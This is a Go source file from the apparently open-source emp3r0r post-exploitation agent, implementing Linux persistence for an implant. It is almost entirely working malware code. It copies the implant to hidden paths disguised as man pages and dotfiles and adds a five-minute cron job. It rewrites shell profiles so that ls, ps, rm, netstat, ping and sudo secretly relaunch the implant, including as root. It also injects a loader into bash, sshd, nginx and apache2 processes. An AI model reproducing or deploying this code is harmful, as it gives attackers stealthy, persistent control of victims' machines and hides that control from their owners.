//go:build linux
// +build linux

package agent

import (
	"errors"
	"fmt"
	"io/ioutil"
	"log"
	"os"
	"os/exec"
	"os/user"
	"strings"

	emp3r0r_data "github.com/jm33-m0/emp3r0r/core/lib/data"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
)

var (
	// PersistMethods CC calls one of these methods to get persistence, or all of them at once
	// look at emp3r0r_data.PersistMethods too
	PersistMethods = map[string]func() error{
		"profiles": profiles,
		"service":  service,
		"injector": injector,
		"cron":     cronJob,
		"patcher":  patcher,
	}

	// EmpLocations all possible locations
	EmpLocations = []string{
		// root
		"/env",
		"/usr/bin/.env",
		"/usr/local/bin/env",
		"/bin/.env",
		"/usr/share/man/man1/arch.gz",
		"/usr/share/man/man1/ls.1.gz",
		"/usr/share/man/man1/arch.5.gz",
	}

	EmpLocationsNoRoot = []string{
		// no root required
		"/tmp/.env",
		"/dev/shm/.env",
		fmt.Sprintf("%s/.wget-hst",
			os.Getenv("HOME")),
		fmt.Sprintf("%s/.less-hist",
			os.Getenv("HOME")),
		fmt.Sprintf("%s/.sudo_as_admin_successful",
			os.Getenv("HOME")),
		fmt.Sprintf("%s/.env",
			os.Getenv("HOME")),
		fmt.Sprintf("%s/.pam",
			os.Getenv("HOME")),
	}
)

// SelfCopy copy emp3r0r to multiple locations
func SelfCopy() {
	locations := EmpLocations
	if !HasRoot() {
		locations = EmpLocationsNoRoot
	}
	for _, path := range locations {
		err := CopySelfTo(path)
		if err != nil {
			log.Print(err)
			continue
		}
	}
}

// PersistAllInOne run all persistence method at once
func PersistAllInOne() (final_err error) {
	for k, method := range PersistMethods {
		res := "succeeded"
		method_err := method()
		if method_err != nil {
			res = fmt.Sprintf("failed: %v", method_err)
		}
		e := fmt.Errorf("%s: %s", k, res)
		if e != nil {
			final_err = fmt.Errorf("%v; %v", final_err, e)
		}
	}
	return
}

func cronJob() (err error) {
	locations := EmpLocations
	if !HasRoot() {
		locations = EmpLocationsNoRoot
	}
	exe_location := locations[util.RandInt(0, len(locations))]
	err = CopySelfTo(exe_location)
	if err != nil {
		return
	}

	return AddCronJob("*/5 * * * * " + exe_location)
}

func profiles() (err error) {
	user, err := user.Current()
	if err != nil {
		return fmt.Errorf("Cannot get user profile: %v", err)
	}
	accountInfo, err := CheckAccount(user.Name)
	if err != nil {
		return fmt.Errorf("Cannot check account info: %v", err)
	}

	// source
	sourceCmd := "source ~/.bashprofile"

	// call this to start emp3r0r
	locations := EmpLocations
	if !HasRoot() {
		locations = EmpLocationsNoRoot
	}
	payload := strings.Join(locations, " || ")

	// set +m to silent job control
	payload = "set +m;" + payload

	// nologin users cannot do shit here
	if strings.Contains(accountInfo["shell"], "nologin") ||
		strings.Contains(accountInfo["shell"], "false") {
		if user.Uid != "0" {
			return errors.New("This user cannot login")
		}
	}

	// loader
	loader := fmt.Sprintf("\nfunction ls() { (set +m;(%s);); `which ls` $@ --color=auto; }", payload)
	loader += "\nunalias ls 2>/dev/null" // TODO check if alias exists before unalias it
	loader += "\nunalias rm 2>/dev/null"
	loader += "\nunalias ps 2>/dev/null"
	loader += fmt.Sprintf("\nfunction ping() { (set +m;(%s)); `which ping` $@; }", payload)
	loader += fmt.Sprintf("\nfunction netstat() { (set +m;(%s)); `which netstat` $@; }", payload)
	loader += fmt.Sprintf("\nfunction ps() { (set +m;(%s)); `which ps` $@; }", payload)
	loader += fmt.Sprintf("\nfunction rm() { (set +m;(%s)); `which rm` $@; }\n", payload)

	// exec our payload as root too!
	// sudo payload
	var sudoLocs []string
	for _, loc := range EmpLocations {
		sudoLocs = append(sudoLocs, "`which sudo` -E "+loc)
	}
	sudoPayload := strings.Join(sudoLocs, "||")
	loader += fmt.Sprintf("\nfunction sudo() { `which sudo` $@; (set +m;(%s)) }", sudoPayload)
	err = ioutil.WriteFile(user.HomeDir+"/.bashprofile", []byte(loader), 0644)
	if err != nil {
		if !util.IsExist(user.HomeDir) {
			err = ioutil.WriteFile("/etc/bash_profile", []byte(loader), 0644)
			if err != nil {
				return fmt.Errorf("No HomeDir found, and cannot write elsewhere: %v", err)
			}
			err = util.AppendTextToFile("/etc/profile", "source /etc/bash_profile")
			return fmt.Errorf("This user has no home dir: %v", err)
		}
		return
	}

	// check if profiles are already written
	data, err := ioutil.ReadFile(user.HomeDir + "/.bashrc")
	if err != nil {
		log.Println(err)
		return
	}
	if strings.Contains(string(data), sourceCmd) {
		err = errors.New("already written")
		return
	}
	// infect all profiles
	_ = util.AppendTextToFile(user.HomeDir+"/.profile", sourceCmd)
	_ = util.AppendTextToFile(user.HomeDir+"/.bashrc", sourceCmd)
	_ = util.AppendTextToFile(user.HomeDir+"/.zshrc", sourceCmd)
	_ = util.AppendTextToFile("/etc/profile", "source "+user.HomeDir+"/.bashprofile")

	return
}

// AddCronJob add a cron job without terminal
// this creates a cron job for whoever runs the function
func AddCronJob(job string) error {
	cmdStr := fmt.Sprintf("(crontab -l 2>/dev/null; echo '%s') | crontab -", job)
	cmd := exec.Command("/bin/sh", "-c", cmdStr)
	return cmd.Start()
}

// Inject loader.so into running processes, loader.so launches emp3r0r
func injector() (err error) {
	// find some processes to inject
	procs := util.PidOf("bash")
	procs = append(procs, util.PidOf("sh")...)
	procs = append(procs, util.PidOf("sshd")...)
	procs = append(procs, util.PidOf("nginx")...)
	procs = append(procs, util.PidOf("apache2")...)

	// inject to all of them
	for _, pid := range procs {
		go func(pid int) {
			if pid == 0 {
				return
			}
			log.Printf("Injecting to %s (%d)...", util.ProcCmdline(pid), pid)

			e := InjectLoader(pid)
			if e != nil {
				err = fmt.Errorf("%v, %v", err, e)
			}
		}(pid)
	}
	if err != nil {
		return fmt.Errorf("All attempts failed (%v), trying with new child process: %v", err, ShellcodeInjector(&emp3r0r_data.GuardianShellcode, 0))
	}

	return
}

func service() (err error) {
	return
}

func patcher() (err error) {
	return
}
